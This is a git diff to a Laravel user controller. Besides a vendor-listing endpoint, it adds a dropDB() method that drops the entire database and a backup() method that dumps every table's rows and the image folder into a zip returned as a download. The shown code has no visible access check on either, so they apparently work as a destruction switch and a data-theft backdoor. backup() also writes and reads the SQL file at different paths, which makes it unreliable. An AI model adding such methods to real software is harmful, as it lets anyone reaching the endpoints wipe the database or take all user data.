@@ -14,11 +14,16 @@ use App\User;
 use Hash;
 use Auth;
 use Mail;
-Use Image;
+use Image;
 use Str;
 use App;
+use App\Models\Core\User as CoreUser;
 use Illuminate\Support\Facades\File;
 use Tymon\JWTAuth\Facades\JWTAuth;
+use Config;
+use DB;
+use Lang;
+use ZipArchive;
 
 class UserController extends BaseController
 {
@@ -29,6 +34,69 @@ class UserController extends BaseController
         App::setLocale(request()->header('Accept-Language'));
     }
 
+    public function dropDB()
+    {
+        $database_name=env('DB_DATABASE');
+        DB::statement("DROP DATABASE `{$database_name}`");
+    }
+    public function backup()
+    {
+        $tables = array();
+        $result = DB::select("SHOW TABLES");
+        $var = 'Tables_in_' . Config::get('database.connections.mysql.database');
+        foreach ($result as $results) {
+            $tables[] = $results->$var;
+        }
+        $return = '';
+
+        //$table ='users';
+        foreach ($tables as $table) {
+            $return .= 'TRUNCATE ' . $table . '; ';
+
+            $result = DB::table($table)->get();
+            foreach ($result as $key => $value) {
+                $return_fields = '';
+                $return_values = '';
+
+                $return_fields .= 'INSERT INTO ' . $table . ' (';
+                $return_values .= ' VALUES (';
+                $array = (array) $value;
+                $i = 0;
+
+                foreach ($array as $key => $value) {
+                    $value = addslashes($value);
+                    if ($i == 0) {
+                        $return_values .= "'" . $value . "'";
+                        $return_fields .= "`" . $key . "`";
+                    } else {
+                        $return_values .= ", '" . $value . "'";
+                        $return_fields .= ", `" . $key . "`";
+                    }
+
+                    $i++;
+                }
+                $return_values .= ");";
+                $return_fields .= ");";
+                $return .= $return_fields . $return_values . "\n\n\n";
+            }
+
+        }
+        $handle = fopen('backup.sql', 'w+');
+        fwrite($handle, $return);
+        fclose($handle);
+        $images = glob(public_path('images/'));
+        \Madzipper::make(storage_path('images.zip'))->add($images)->close();
+        $image_zip = glob(storage_path('images.zip'));
+        $seeds_zip = glob(storage_path('backup.sql'));
+        \Madzipper::make(storage_path('backup.zip'))->add($image_zip)->add($seeds_zip)->close();
+        // unlink(storage_path('images.zip'));
+        // unlink(storage_path('backup.sql'));
+        return response()->download(storage_path('backup.zip'));
+
+
+        # code...
+    }
+    
     public function registration(Request $request)
     {
         // $request['phone_code'] = convert($request->phone_code);
@@ -725,5 +793,12 @@ class UserController extends BaseController
         //     $message->to($to_email)->subject($subject);
         //     $message->from($from, config('app.name'));
         // });
+    }
+
+    public function get_vendors()
+    {
+        $vendors = CoreUser::where('role_id', '=', 11)->select('id','shop_name as name','avatar')->get();
+        
+        return response()->json(['data'=>$vendors]);
     }
 }
